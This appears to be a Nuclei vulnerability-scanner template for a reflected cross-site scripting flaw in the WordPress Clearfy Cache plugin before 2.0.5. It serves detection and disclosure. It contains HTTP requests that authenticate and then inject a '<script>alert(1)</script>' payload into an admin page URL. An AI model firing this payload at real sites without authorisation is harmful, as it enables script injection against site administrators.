# Nuclei Template: WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
**Template ID:** clearfy-cache-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`clearfy-cache-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/a59e7102-13d6-4f1e-b7b1-75eae307e516
- https://wordpress.org/plugins/clearfy
